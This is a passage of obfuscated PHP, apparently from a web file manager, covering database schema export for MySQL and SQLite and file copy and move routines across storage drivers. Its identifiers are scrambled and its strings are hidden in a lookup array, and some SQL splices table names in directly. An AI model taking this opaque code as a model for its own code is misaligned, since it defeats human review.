(!$¶Â“¯[$ÜÁ£Ç‰â[824]]) { continue; } fwrite($åØ“±¿™, $¶Â“¯[$ÜÁ£Ç‰â[824]] . PHP_EOL . PHP_EOL); if (!in_array($ªÓ–Ïîé, $î‘ñË˜)) { fwrite($­æ€“Æ, $¶Â“¯[$ÜÁ£Ç‰â[13]] . PHP_EOL . PHP_EOL); } } } fclose($åØ“±¿™); fclose($­æ€“Æ); $÷·Ñ–¶ø = array($ÜÁ£Ç‰â[824] => $·ø•„„ô, $ÜÁ£Ç‰â[13] => $”“‹€§¡); return $µŠ€€ô‰ ? $÷·Ñ–¶ø[$µŠ€€ô‰] : $÷·Ñ–¶ø; } public function dbType($™ğí›ªÉ = false) { $ãÓ¶Áº =& $_SERVER[¡“ËÌ§œ]; $ÓÅÖ¯…Í = $™ğí›ªÉ ? $GLOBALS[$ãÓ¶Áº[6]][$ãÓ¶Áº[21]] : $this->database; $ÓÅÖ¯…Í = array_change_key_case($ÓÅÖ¯…Í); $ÃçÚëÆ´ = $ÓÅÖ¯…Í[$ãÓ¶Áº[987]]; if ($ÃçÚëÆ´ == $ãÓ¶Áº[984]) { $ªÇıºü = explode($ãÓ¶Áº[4], $ÓÅÖ¯…Í[$ãÓ¶Áº[993]]); $ÃçÚëÆ´ = $ªÇıºü[0]; } $”úÚ£Ì = array($ãÓ¶Áº[1115] => $ãÓ¶Áº[13], $ãÓ¶Áº[932] => $ãÓ¶Áº[824]); if (isset($”úÚ£Ì[$ÃçÚëÆ´])) { $ÃçÚëÆ´ = $”úÚ£Ì[$ÃçÚëÆ´]; } return $ÃçÚëÆ´; } public function sqlFromMysql($Ç…»Ì‚ñ, $ïó àÊà = '') { $†ëëš‚Ò =& $_SERVER[¡“ËÌ§œ]; $ÈŞˆ–Ê = $this->model()->db(); $“õ ¢ù  = $ÈŞˆ–Ê->query($†ëëš‚Ò[1116] . $Ç…»Ì‚ñ . $†ëëš‚Ò[414]); if (!$“õ ¢ù  || !$“õ ¢ù [0]) { return !1; } $¥˜ë‹†² = _get($“õ ¢ù [0], $†ëëš‚Ò[1117], $†ëëš‚Ò[12]); if (!$¥˜ë‹†²) { return !1; } $ÈÜó·Èë = "\104\122\117\120\x20\x54\101\102\x4c\x45\40\111\106\x20\x45\130\x49\123\x54\x53\x20\x60{$Ç…»Ì‚ñ}\x60\73" . PHP_EOL . $¥˜ë‹†² . $†ëëš‚Ò[71]; if ($ïó àÊà && $ïó àÊà == $†ëëš‚Ò[824]) { return $ÈÜó·Èë; } $¸½Åß” = array_change_key_case($GLOBALS[$†ëëš‚Ò[6]][$†ëëš‚Ò[21]]); $ëÇ¦º†ô = $¸½Åß”[$†ëëš‚Ò[992]]; $İäñÂ = $†ëëš‚Ò[1118] . $ëÇ¦º†ô . $†ëëš‚Ò[1119] . $Ç…»Ì‚ñ . $†ëëš‚Ò[58]; $–ÙÓŒ¬— = $†ëëš‚Ò[1120] . $Ç…»Ì‚ñ . $†ëëš‚Ò[920]; $×ÎÀã­‡ = $ÈŞˆ–Ê->query($İäñÂ); if (empty($×ÎÀã­‡)) { $öˆÅ—”ı = array($†ëëš‚Ò[824] => $†ëëš‚Ò[12], $†ëëš‚Ò[13] => $†ëëš‚Ò[12]); return $ïó àÊà ? $öˆÅ—”ı[$ïó àÊà] : $öˆÅ—”ı; } $¬“øÒóŸ = $ÈŞˆ–Ê->query($–ÙÓŒ¬—); $ö˜şœíƒ = $†ëëš‚Ò[12]; $ÂÏ¡—Ù = array(); foreach ($¬“øÒóŸ as $õÚîó¨) { if (!$ö˜şœíƒ && $õÚîó¨[$†ëëš‚Ò[1121]] == $†ëëš‚Ò[1122]) { $ö˜şœíƒ = $õÚîó¨[$†ëëš‚Ò[1123]]; } if (isset($ÂÏ¡—Ù[$õÚîó¨[$†ëëš‚Ò[1121]]])) { $ÂÏ¡—Ù[$õÚîó¨[$†ëëš‚Ò[1121]]][$†ëëš‚Ò[1124]][] = $õÚîó¨[$†ëëš‚Ò[1123]]; continue; } $ÂÏ¡—Ù[$õÚîó¨[$†ëëš‚Ò[1121]]] = array($†ëëš‚Ò[1125] => $õÚîó¨[$†ëëš‚Ò[1121]], $†ëëš‚Ò[1124] => array($õÚîó¨[$†ëëš‚Ò[1123]]), $†ëëš‚Ò[1126] => $õÚîó¨[$†ëëš‚Ò[1127]] == $†ëëš‚Ò[88] ? 0 : 1); } $æÛÑçã¼ = array(); foreach ($ÂÏ¡—Ù as $õÚîó¨) { $­ˆûËìÛ = $õÚîó¨[$†ëëš‚Ò[1125]] == $†ëëš‚Ò[1122]; $Ã¨¥à¾‚ = array($†ëëš‚Ò[1128], $õÚîó¨[$†ëëš‚Ò[1126]] == $†ëëš‚Ò[88] && !$­ˆûËìÛ ? $†ëëš‚Ò[1129] : $†ëëš‚Ò[12], $†ëëš‚Ò[1130], $†ëëš‚Ò[1131] . $Ç…»Ì‚ñ . $†ëëš‚Ò[11] . ($­ˆûËìÛ ? $†ëëš‚Ò[1132] : $õÚîó¨[$†ëëš‚Ò[1125]]) . $†ëëš‚Ò[118], $†ëëš‚Ò[1133], $†ëëš‚Ò[118] . $Ç…»Ì‚ñ . $†ëëš‚Ò[118], $†ëëš‚Ò[1134] . implode($†ëëš‚Ò[1135], $õÚîó¨[$†ëëš‚Ò[1124]]) . $†ëëš‚Ò[1136]); $æÛÑçã¼[] = implode($†ëëš‚Ò[53], $Ã¨¥à¾‚) . $†ëëš‚Ò[71]; } $ —Å‰ú = array(); $æ¢ÚíæŸ = array($†ëëš‚Ò[1137] => $†ëëš‚Ò[1138], $†ëëš‚Ò[1138] => $†ëëš‚Ò[1138], $†ëëš‚Ò[317] => $†ëëš‚Ò[344], $†ëëš‚Ò[316] => $†ëëš‚Ò[344]); foreach ($×ÎÀã­‡ as $õÚîó¨) { $Ã¨¥à¾‚ = array($†ëëš‚Ò[118] . $õÚîó¨[$†ëëš‚Ò[1139]] . $†ëëš‚Ò[118], isset($æ¢ÚíæŸ[$õÚîó¨[$†ëëš‚Ò[1140]]]) ? $æ¢ÚíæŸ[$õÚîó¨[$†ëëš‚Ò[1140]]] : $õÚîó¨[$†ëëš‚Ò[1141]], $õÚîó¨[$†ëëš‚Ò[1142]] == $†ëëš‚Ò[918] ? $†ëëš‚Ò[1143] : $†ëëš‚Ò[1144], $õÚîó¨[$†ëëš‚Ò[1139]] == $ö˜şœíƒ ? $†ëëš‚Ò[1145] : $†ëëš‚Ò[12], $õÚîó¨[$†ëëš‚Ò[969]] ? strtoupper(str_replace($†ëëš‚Ò[11], $†ëëš‚Ò[12], $õÚîó¨[$†ëëš‚Ò[969]])) : $†ëëš‚Ò[12]); $ —Å‰ú[] = trim(implode($†ëëš‚Ò[53], $Ã¨¥à¾‚)); } $šöğµêÆ = array($†ëëš‚Ò[1146] . $Ç…»Ì‚ñ . $†ëëš‚Ò[1147], $†ëëš‚Ò[1148] . $Ç…»Ì‚ñ . $†ëëš‚Ò[1149], implode($†ëëš‚Ò[50] . PHP_EOL, $ —Å‰ú), $†ëëš‚Ò[966]); $†‡šÕ¸¢ = implode(PHP_EOL, array_merge($šöğµêÆ, $æÛÑçã¼)); if ($ïó àÊà && $ïó àÊà == $†ëëš‚Ò[13]) { return $†‡šÕ¸¢; } $öˆÅ—”ı = array($†ëëš‚Ò[824] => $ÈÜó·Èë, $†ëëš‚Ò[13] => $†‡šÕ¸¢); return $ïó àÊà ? $öˆÅ—”ı[$ïó àÊà] : $öˆÅ—”ı; } public function sqlFromSqlite($€µÏ˜‹, $‰È´€Š§ = '') { $Îâ•´Êˆ =& $_SERVER[¡“ËÌ§œ]; $éÏó§½Ò = $this->model()->db(); $®ÅÎ‰Ñ¾ = "\120\122\x41\x47\x4d\101\40\x54\101\x42\114\x45\x5f\111\116\106\x4f\x20\50\x27{$€µÏ˜‹}\47\51"; $ïØ¨Å¢æ = "\x53\105\114\105\x43\124\x20\52\40\x46\122\x4f\x4d\x20\x73\161\x6c\x69\164\x65\137\x6d\141\x73\164\145\162\x20\127\110\x45\122\105\40\x74\x62\x6c\x5f\x6e\x61\x6d\145\40\x3d\40\47{$€µÏ˜‹}\x27"; $åª™û¿¸ = $éÏó§½Ò->query($®ÅÎ‰Ñ¾); if (empty($åª™û¿¸)) { $Ñû‘¾ß‘ = array($Îâ•´Êˆ[824] => $Îâ•´Êˆ[12], $Îâ•´Êˆ[13] => $Îâ•´Êˆ[12]); return $‰È´€Š§ ? $Ñû‘¾ß‘[$‰È´€Š§] : $Ñû‘¾ß‘; } $–õ¬‘¸£ = $éÏó§½Ò->query($ïØ¨Å¢æ); $”¯ÈÃ±Á = $ÑÅñÇ÷ = array(); foreach ($–õ¬‘¸£ as $”‡•™Âœ) { if ($”‡•™Âœ[$Îâ•´Êˆ[33]] == $Îâ•´Êˆ[308]) { $”¯ÈÃ±Á[] = $”‡•™Âœ[$Îâ•´Êˆ[1150]]; } else { $ÑÅñÇ÷[$”‡•™Âœ[$Îâ•´Êˆ[32]]] = $”‡•™Âœ[$Îâ•´Êˆ[1150]]; } } $ù¸ñêË = array_merge(array($Îâ•´Êˆ[1146] . $€µÏ˜‹ . $Îâ•´Êˆ[118]), $”¯ÈÃ±Á, array_values($ÑÅñÇ÷)); $ù¸ñêË = implode($Îâ•´Êˆ[71] . PHP_EOL, $ù¸ñêË) . $Îâ•´Êˆ[71]; if ($‰È´€Š§ && $‰È´€Š§ == $Îâ•´Êˆ[13]) { return $ù¸ñêË; } $½×ßœÈ¹ = array(); $Äè¥¥Ø‘ = array($Îâ•´Êˆ[1138] => $Îâ•´Êˆ[1151], $Îâ•´Êˆ[344] => $Îâ•´Êˆ[1152]); $”€Ê£Ÿ‚ = $Îâ•´Êˆ[12]; foreach ($åª™û¿¸ as $”‡•™Âœ) { if ($”‡•™Âœ[$Îâ•´Êˆ[57]] == $Îâ•´Êˆ[88]) { $”€Ê£Ÿ‚ = $”‡•™Âœ[$Îâ•´Êˆ[32]]; } $äƒ£«Ó¬ = array($Îâ•´Êˆ[414] . $”‡•™Âœ[$Îâ•´Êˆ[32]] . $Îâ•´Êˆ[414], isset($Äè¥¥Ø‘[$”‡•™Âœ[$Îâ•´Êˆ[33]]]) ? $Äè¥¥Ø‘[$”‡•™Âœ[$Îâ•´Êˆ[33]]] : $”‡•™Âœ[$Îâ•´Êˆ[33]], $”‡•™Âœ[$Îâ•´Êˆ[35]] == $Îâ•´Êˆ[88] ? $Îâ•´Êˆ[1143] : $Îâ•´Êˆ[1153] . $”‡•™Âœ[$Îâ•´Êˆ[56]], $”‡•™Âœ[$Îâ•´Êˆ[57]] == $Îâ•´Êˆ[88] ? $Îâ•´Êˆ[1154] : $Îâ•´Êˆ[12]); $½×ßœÈ¹[] = trim(implode($Îâ•´Êˆ[53], $äƒ£«Ó¬)); } foreach ($ÑÅñÇ÷ as $ƒ®éšÁ· => $Öäãë»±) { $ŞÒèœµË = str_replace($Îâ•´Êˆ[1155] . $€µÏ˜‹ . $Îâ•´Êˆ[11], $Îâ•´Êˆ[12], $ƒ®éšÁ·); $ÊÔÙç¦À = str_replace(array($Îâ•´Êˆ[118], $Îâ•´Êˆ[977]), $Îâ•´Êˆ[414], substr($Öäãë»±, stripos($Öäãë»±, $Îâ•´Êˆ[289]))); if ($ŞÒèœµË == $Îâ•´Êˆ[1132]) { $âšÎşè = $Îâ•´Êˆ[1156] . $”€Ê£Ÿ‚ . $Îâ•´Êˆ[1157]; } else { $âšÎşè = (stripos($ŞÒèœµË, $Îâ•´Êˆ[11]) ? $Îâ•´Êˆ[1158] : $Îâ•´Êˆ[12]) . ($Îâ•´Êˆ[1159] . $ŞÒèœµË . $Îâ•´Êˆ[1160] . $ÊÔÙç¦À); } $½×ßœÈ¹[] = $âšÎşè; } $Œ¶»ï°‘ = array($Îâ•´Êˆ[1161] . $€µÏ˜‹ . $Îâ•´Êˆ[1162], $Îâ•´Êˆ[1163] . $€µÏ˜‹ . $Îâ•´Êˆ[1164], implode($Îâ•´Êˆ[50] . PHP_EOL, $½×ßœÈ¹), $Îâ•´Êˆ[1165]); $ÍŞšì¬ = implode(PHP_EOL, $Œ¶»ï°‘); if ($‰È´€Š§ && $‰È´€Š§ == $Îâ•´Êˆ[824]) { return $ÍŞšì¬; } $Ñû‘¾ß‘ = array($Îâ•´Êˆ[824] => $ÍŞšì¬, $Îâ•´Êˆ[13] => $ù¸ñêË); return $‰È´€Š§ ? $Ñû‘¾ß‘[$‰È´€Š§] : $Ñû‘¾ß‘; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($‹¶©µë§, $°”µÒ) { $²«ø¿½ü =& $_SERVER[¡“ËÌ§œ]; $¯ú¬ö‡© = $°”µÒ; $GLOBALS[$²«ø¿½ü[1166]] = $²«ø¿½ü[1167] . $‹¶©µë§; Hook::trigger($²«ø¿½ü[1167] . $‹¶©µë§ . $²«ø¿½ü[1168], $¯ú¬ö‡©); $½ŸıÎè¬ = self::driverMake($°”µÒ[0]); if (!$½ŸıÎè¬) { return !1; } if (method_exists($½ŸıÎè¬, $‹¶©µë§)) { $ß’®‘¦“ = @call_user_func_array(array($½ŸıÎè¬, $‹¶©µë§), $°”µÒ); } else { if (method_exists($½ŸıÎè¬, $²«ø¿½ü[1169])) { $ß’®‘¦“ = @call_user_func_array(array($½ŸıÎè¬, $‹¶©µë§), $°”µÒ); } else { if (method_exists(self, $‹¶©µë§)) { $ß’®‘¦“ = @call_user_func_array(array(self, $‹¶©µë§), $°”µÒ); } else { $ß’®‘¦“ = call_user_func_array(array(parent, $‹¶©µë§), $°”µÒ); } } } Hook::trigger($²«ø¿½ü[1167] . $‹¶©µë§ . $²«ø¿½ü[1170], $¯ú¬ö‡©, $ß’®‘¦“); return $ß’®‘¦“; } public static function init($“²µï²) { return self::driverMake($“²µï²); } public static function copy($˜Ã•Ò»Ï, $í÷µ×Êµ, $ÜˆÑæ«æ = false, $ğÎçŞ²Ë = false) { return self::copyMoveStart($˜Ã•Ò»Ï, $í÷µ×Êµ, $ÜˆÑæ«æ, $_SERVER[¡“ËÌ§œ][584], $ğÎçŞ²Ë); } public static function move($ü¢æÙ•ä, $ı¾ÛÎ…ª, $şúø×Û = false, $„û¨•ÍÀ = false) { return self::copyMoveStart($ü¢æÙ•ä, $ı¾ÛÎ…ª, $şúø×Û, $_SERVER[¡“ËÌ§œ][586], $„û¨•ÍÀ); } private static function copyMoveStart($İÄ£¸“›, $› ±„íÚ, $åôÁô‹Ì, $åó‰·¾, $•ÉòÉ½µ) { $à’œ¯ÖÄ =& $_SERVER[¡“ËÌ§œ]; $ñªçœ = array($İÄ£¸“›, $› ±„íÚ, $åôÁô‹Ì, $•ÉòÉ½µ); Hook::trigger($à’œ¯ÖÄ[1167] . $åó‰·¾ . $à’œ¯ÖÄ[1168], $ñªçœ); $ıíöâİû = self::copyMove($İÄ£¸“›, $› ±„íÚ, $åôÁô‹Ì, $åó‰·¾, $•ÉòÉ½µ); Hook::trigger($à’œ¯ÖÄ[1167] . $åó‰·¾ . $à’œ¯ÖÄ[1170], $ñªçœ, $ıíöâİû); return $ıíöâİû; } public static function saveFile($¶´·„ÅÂ, $¤Í Ö¬í, $ÙíÊ¨®š = true) { $ŒŸÊ©ÛÑ =& $_SERVER[¡“ËÌ§œ]; $ê±óŸŞ­ = self::info($¤Í Ö¬í); $ìèÓÕ ‚ = self::driverMake($¶´·„ÅÂ); $îØ§—½ã = self::driverMake($¤Í Ö¬í); $ ùªÂÛÚ = !1; if ($îØ§—½ã->pathParse[$ŒŸÊ©ÛÑ[1171]]) { $ ùªÂÛÚ = $îØ§—½ã; $¦„Ï­œÁ = $îØ§—½ã->pathParse[$ŒŸÊ©ÛÑ[1171]]; $îØ§—½ã = self::driverMake($¦„Ï­œÁ); } if ($ìèÓÕ ‚->pathParse[$ŒŸÊ©ÛÑ[1171]]) { $ÃˆºÁŠÄ = $ìèÓÕ ‚->pathParse[$ŒŸÊ©ÛÑ[1171]]; $ìèÓÕ ‚ = self::driverMake($ÃˆºÁŠÄ); } $ˆ³ğ÷€Ğ = $îØ§—½ã->pathFather($¤Í Ö¬í); $‚¬ËñÃ = !0; if (!$ÙíÊ¨®š && self::driverIsSame($ìèÓÕ ‚, $îØ§—½ã)) { $‚¬ËñÃ = !1; } $ˆıİËù• = self::copyFile($ìèÓÕ ‚, $¶´·„ÅÂ, $îØ§—½ã, $ˆ³ğ÷€Ğ, $ê±óŸŞ­[$ŒŸÊ©ÛÑ[32]], $‚¬ËñÃ); if ($ ùªÂÛÚ) { $ˆıİËù• = $ ùªÂÛÚ->getPathOuter($ˆıİËù•); } return $ˆıİËù•; } private static function copyMove($ÕáÚ°‘Œ, $¾¨Ÿ®Û, $©¬éöÜÉ, $ãˆËÜ–, $Í¹º÷ú = false) { $¸ãÆÆç¨ =& $_SERVER[¡“ËÌ§œ]; if (!$ÕáÚ°‘Œ || $ÕáÚ°‘Œ == $¸ãÆÆç¨[8] || !$¾¨Ÿ®Û) { return !1; } ignore_timeout(); $Ê®Ê‡ = self::driverMake($ÕáÚ°‘Œ); $ä…º¬ºÂ = self::driverMake($¾¨Ÿ®Û); $Æ°›°©¡ = $ãˆËÜ– == $¸ãÆÆç¨[586]; $¿œÕó˜¯ = !1; if ($ä…º¬ºÂ->pathParse[$¸ãÆÆç¨[1171]]) { $¿œÕó˜¯ = $ä…º¬ºÂ; $¾¨Ÿ®Û = $ä…º¬ºÂ->pathParse[$¸ãÆÆç¨[1171]]; $ä…º¬ºÂ = self::driverMake($¾¨Ÿ®Û); } if ($Ê®Ê‡->pathParse[$¸ãÆÆç¨[1171]]) { $ÕáÚ°‘Œ = $Ê®Ê‡->pathParse[$¸ãÆÆç¨[1171]]; $Ê®Ê‡ = self::driverMake($ÕáÚ°‘Œ); } self::check($Ê®Ê‡, $ÕáÚ°‘Œ, $ä…º¬ºÂ, $¾¨Ÿ®Û); Hook::trigger($¸ãÆÆç¨[1172], $Ê®Ê‡, $ÕáÚ°‘Œ, $ä…º¬ºÂ, $¾¨Ÿ®Û); $ÆÃ½Áş¢ = self::driverIsSame($Ê®Ê‡, $ä…º¬ºÂ); if ($ÆÃ½Áş¢) { if ($ãˆËÜ– == $¸ãÆÆç¨[586] && !method_exists($ä…º¬ºÂ, $¸ãÆÆç¨[1173]) && trim($¾¨Ÿ®Û, $¸ãÆÆç¨[8]) == trim($ä…º¬ºÂ->pathFather($ÕáÚ°‘Œ), $¸ãÆÆç¨[8])) { if ($Ê®Ê‡->pathThis($ÕáÚ°‘Œ) != $Í¹º÷ú && !$Ê®Ê‡->isTypeObject()) { return $Ê®Ê‡->rename($ÕáÚ°‘Œ, $Í¹º÷ú); } return $ä…º¬ºÂ->getPathOuter($ÕáÚ°‘Œ); } if (method_exists($ä…º¬ºÂ, $ãˆËÜ–)) { return $ä…º¬ºÂ->{$ãˆËÜ–}($ÕáÚ°‘Œ, $¾¨Ÿ®Û, $©¬éöÜÉ, $Í¹º÷ú); } } if ($ÆÃ½Áş¢ && $ãˆËÜ– == $¸ãÆÆç¨[586] && $ä…º¬ºÂ->getType() == $¸ãÆÆç¨[106]) { $Í†¨³ß¼ = $ä…º¬ºÂ->movePath($ÕáÚ°‘Œ, $¾¨Ÿ®Û, $Í¹º÷ú); if ($Í†¨³ß¼) { return $Í†¨³ß¼; } } $ßË³¬Òı = $Ê®Ê‡->isFile($ÕáÚ°‘Œ); if (!$ßË³¬Òı && $ä…º¬ºÂ->getType() == $¸ãÆÆç¨[777] && $Ê®Ê‡->getType() == $¸ãÆÆç¨[106]) { $Í†¨³ß¼ = $ä…º¬ºÂ->copyFolderFromIO($Ê®Ê‡, $ÕáÚ°‘Œ, $¾¨Ÿ®Û, $©¬éöÜÉ, $Æ°›°©¡, $Í¹º÷ú); } else { $Í†¨³ß¼ = self::copyPath($Ê®Ê‡, $ÕáÚ°‘Œ, $ä…º¬ºÂ, $¾¨Ÿ®Û, $©¬éöÜÉ, $Æ°›°©¡, $ßË³¬Òı, $Í¹º÷ú); } if ($Í†¨³ß¼ && $Æ°›°©¡) { $Ê®Ê‡->remove($ÕáÚ°‘Œ); } if ($¿œÕó˜¯) { $Í†¨³ß¼ = $¿œÕó˜¯->getPathOuter($Í†¨³ß¼); } return $Í†¨³ß¼; } private static function check($îı¿Œ£, $ôı„ç®­, $ÓÑìí‡, &$‘ğµºşˆ) { $şÛ›Ş÷¹ =& $_SERVER[¡“ËÌ§œ]; if (self::driverIsSame($îı¿Œ£, $ÓÑìí‡) && $îı¿Œ£->isFolder($ôı„ç®­) && $îı¿Œ£->isParentOf($ôı„ç®­, $‘ğµºşˆ)) { show_json(LNG($şÛ›Ş÷¹[1174]), !1); } if (!$îı¿Œ£->exist($ôı„ç®­)) { show_json(LNG($şÛ›Ş÷¹[105]), !1); } } private static function copyPath($¦§£şÍ†, $æè˜ñ•, $Ç¤„Ê‘, $‚­ûÆÛÆ, $´‡…“ÖÖ, $Òó¤ŸÔ, $Ó¦âå, $¨ÄäÍÉ = false, $”ŸŸ¿†Ä = true) { $•ÍÁÁ§ =& $_SERVER[¡“ËÌ§œ]; $ˆ·Œ¯‰Ñ = empty($¨ÄäÍÉ) && $¨ÄäÍÉ !== $•ÍÁÁ§[198] ? $¦§£şÍ†->pathThis($æè˜ñ•) : $¨ÄäÍÉ; if ($´‡…“ÖÖ) { $ˆæüË­Ò = $Ç¤„Ê‘->fileNameExist($‚­ûÆÛÆ, $ˆ·Œ¯‰Ñ); $úÈæ÷¥û = $ˆ·Œ¯‰Ñ; $ˆ·Œ¯‰Ñ = $Ç¤„Ê‘->fileNameAuto($‚­ûÆÛÆ, $ˆ·Œ¯‰Ñ, $´‡…“ÖÖ, !$Ó¦âå); if (!$ˆæüË­Ò || $úÈæ÷¥û != $ˆ·Œ¯‰Ñ) { $´‡…“ÖÖ = !1; } if ($”ŸŸ¿†Ä && !$´‡…“ÖÖ) { $Ç¤„Ê‘->_data[$•ÍÁÁ§[1175]] = !0; } } if ($Ó¦âå) { return self::copyFile($¦§£şÍ†, $æè˜ñ•, $Ç¤„Ê‘, $‚­ûÆÛÆ, $ˆ·Œ¯‰Ñ, $Òó¤ŸÔ); } if ($´‡…“ÖÖ == REPEAT_RENAME_FOLDER) { $´‡…“ÖÖ = !1; } $şÛ¦½¤ = rtrim($‚­ûÆÛÆ, $•ÍÁÁ§[8]) . $•ÍÁÁ§[8] . $ˆ·Œ¯‰Ñ; $‡Í‹’¸Õ = $Ç¤„Ê‘->mkdir($Ç¤„Ê‘->getPath($şÛ¦½¤), $´‡…“ÖÖ); $‚­ûÆÛÆ = $Ç¤„Ê‘->getPathInner($‡Í‹’¸Õ); $ß®ß‹‘ = $¦§£şÍ†->listPath($æè˜ñ•, !0); $ß®ß‹‘ = is_array($ß®ß‹‘) ? $ß®ß‹‘ : array($•ÍÁÁ§[83] => array(), $•ÍÁÁ§[82] => array()); $ëÕçÎÏº = array_merge($ß®ß‹‘[$•ÍÁÁ§[83]], $ß®ß‹‘[$•ÍÁÁ§[82]]); foreach ($ëÕçÎÏº as $â£Ï®ô§) { $³£´Ó³ = $â£Ï®ô§[$•ÍÁÁ§[33]] == $•ÍÁÁ§[200]; $æè˜ñ• = $¦§£şÍ†->getPathInner($â£Ï®ô§[$•ÍÁÁ§[84]]); $€€µ» ¤ = self::copyPath($¦§£şÍ†, $æè˜ñ•, $Ç¤„Ê‘, $‚­ûÆÛÆ, $´‡…“ÖÖ, $Òó¤ŸÔ, $³£´Ó³, !1, !1); if (!$€€µ» ¤) { IO::errorTips($•ÍÁÁ§[1176] . $æè˜ñ• . $•ÍÁÁ§[70] . $‚­ûÆÛÆ); } } self::copyMoveKeepInfo($¦§£şÍ†, $æè˜ñ•, $‡Í‹’¸Õ); return $‡Í‹’¸Õ; } private static function copyFile($åÔƒ›³³, $ˆÈà¬¡›, $ûùªÂæ, $ˆ‚ìÓÌ, $·‘ô²Æ‰, $û£›‡Œ») { $ÄÔ¥ÓÛ§ =& $_SERVER[¡“ËÌ§œ]; $ˆ‚ìÓÌ = $ûùªÂæ->getPath(rtrim($ˆ‚ìÓÌ, $ÄÔ¥ÓÛ§[8]) . $ÄÔ¥ÓÛ§[8] . $·‘ô²Æ‰); $„Ş´”¸‹ = $ÄÔ¥ÓÛ§[1177] . time() . rand_string(5); Hook::trigger($ÄÔ¥ÓÛ§[1178], $åÔƒ›³³, $ˆÈà¬¡›, $ûùªÂæ, $ˆ‚ìÓÌ, $·‘ô²Æ‰, $„Ş´”¸‹); if (self::driverIsSame($åÔƒ›³³, $ûùªÂæ)) { if ($û£›‡Œ») { $ò£›×›£ = $ûùªÂæ->moveFile($ˆÈà¬¡›, $ˆ‚ìÓÌ); } else { $ò£›×›£ = $ûùªÂæ->copyFile($ˆÈà¬¡›, $ˆ‚ìÓÌ); } Hook::trigger($ÄÔ¥ÓÛ§[1179], $åÔƒ›³³, $ˆÈà¬¡›, $ûùªÂæ, $ˆ‚ìÓÌ, $·‘ô²Æ‰, $ò£›×›£); self::copyMoveKeepInfo($åÔƒ›³³, $ˆÈà¬¡›, $ò£›×›£); return $ò£›×›£; } $œò´öÈı = TEMP_FILES; if ($GLOBALS[$ÄÔ¥ÓÛ§[6]][$ÄÔ¥ÓÛ§[89]][$ÄÔ¥ÓÛ§[816]]) { $œò´öÈı = $GLOBALS[$ÄÔ¥ÓÛ§[6]][$ÄÔ¥ÓÛ§[89]][$ÄÔ¥ÓÛ§[816]]; } $ç´îÍıç = $œò´öÈı; mk_dir($ç´îÍıç); $”…’˜­‚ = $ç´îÍıç . $„Ş´”¸‹; $‘íùİ = $”…’˜­‚; $”…’˜­‚ = $åÔƒ›³³->download($ˆÈà¬¡›, $”…’˜­‚); $”…’˜­‚ = $åÔƒ›³³->iconvApp($”…’˜­‚); if (substr($”…’˜­‚, strlen($œò´öÈı)) == $œò´öÈı) { $û£›‡Œ» = !0; } $ò£›×›£ = $ûùªÂæ->upload($ˆ‚ìÓÌ, $”…’˜­‚, $û£›‡Œ»); self::remove($‘íùİ); Hook::trigger($ÄÔ¥ÓÛ§[1179], $åÔƒ›³³, $ˆÈà¬¡›, $ûùªÂæ, $ˆ‚ìÓÌ, $·‘ô²Æ‰, $ò£›×›£); self::copyMoveKeepInfo($åÔƒ›³³, $ˆÈà¬¡›, $ò£›×›£); return $ò£›×›£; } private static function copyMoveKeepInfo($´Õ¦Îğ°, $éìÊß, $÷¦”šÙÅ) { if (!$÷¦”šÙÅ) { return; } $ôÜ½Ì…í = $´Õ¦Îğ°->info($éìÊß); if (!is_array($ôÜ½Ì…í)) { return; } IO::setModifyTime($÷¦”šÙÅ, $ôÜ½Ì…í[$_SERVER[¡“ËÌ§œ][85]]); } public static function pathFather($³¹›ê—…) { $ÂÔàıØØ = IO::init($³¹›ê—…); $©Ï„†Û„ = $ÂÔàıØØ->pathFather($ÂÔàıØØ->path); return $ÂÔàıØØ->getPathOuter($©Ï„†Û„); } public static function fileOut($¢Ë«›¢ï, $ˆ‰ıø† = false, $×Œ¨‰Åî = false, $½Ñ¯ÂŒˆ = '') { $›Ôƒïé = self::driverMake($¢Ë«›¢ï); if ($›Ôƒïé->isFileOutServer()) { return $›Ôƒïé->fileOutServer($¢Ë«›¢ï, $ˆ‰ıø†, $×Œ¨‰Åî, $½Ñ¯ÂŒˆ); } return $›Ôƒïé->fileOut($¢Ë«›¢ï, $ˆ‰ıø†, $×Œ¨‰Åî, $½Ñ¯ÂŒˆ); } public static function fileOutImage($òûêÂÌ¤, $¸¿Õ = 250) { $éæ°Ÿø = array(250, 600, 1200, 2000, 3000, 5000); for ($ÉıÉê¤÷ = 0; $ÉıÉê¤÷ < count($éæ°Ÿø); $ÉıÉê¤÷++) { if ($ÉıÉê¤÷ == 0 && $¸¿Õ <= $éæ°Ÿø[$ÉıÉê¤÷]) { $¸¿Õ = $éæ°Ÿø[$ÉıÉê¤÷]; break; } else { if ($¸¿Õ > $éæ°Ÿø[$ÉıÉê¤÷ - 1] && $¸¿Õ <= $éæ°Ÿø[$ÉıÉê¤÷]) { $¸¿Õ = $éæ°Ÿø[$ÉıÉê¤÷]; break; } else { if ($ÉıÉê¤÷ == count($éæ°Ÿø) - 1 && $¸¿Õ > $éæ°Ÿø[$ÉıÉê¤÷]) { $¸¿Õ = $éæ°Ÿø[$ÉıÉê¤÷]; break; } } } } $¸²Ï²‡ = self::driverMake($òûêÂÌ¤); if ($¸²Ï²‡->isFileOutServer()) { return $¸²Ï²‡->fileOutImageServer($òûêÂÌ¤, $¸¿Õ); } return $¸²Ï²‡->fileOutImage($òûêÂÌ¤, $¸¿Õ); } private static function driverIsSame($†±¶²û¦, $Ë›­‰°Í) { $ğ½ÇÒ¾ã =& $_SERVER[¡“ËÌ§œ]; $Èü«“ú½ = $†±¶²û¦->getType(); $è±ÜÈĞÒ = $Ë›­‰°Í->getType(); if ($Èü«“ú½ != $è±ÜÈĞÒ) { return !1; } if ($Èü«“ú½ == $ğ½ÇÒ¾ã[777]) { return !0; } if ($Èü«“ú½ == $ğ½ÇÒ¾ã[106]) { return !0; } if ($†±¶²û¦->pathDriver == $Ë›­‰°Í->pathDriver) { return !0; } return !1; } public static function copyUpdate($÷÷…ÕÇ«, $ÖïØ²İ) { $Ä‚ğ¿¦  =& $_SERVER[¡“ËÌ§œ]; if (!IO::exist($÷÷…ÕÇ«)) { return !1; } if (!IO::exist($ÖïØ²İ)) { IO::mkdir($ÖïØ²İ); } $¢–ìØ¬ = array_to_keyvalue(self::listAllSimple($÷÷…ÕÇ«), $Ä‚ğ¿¦ [84]); $ºÄÅ‡æ¢ = array_to_keyvalue(self::listAllSimple($ÖïØ²İ), 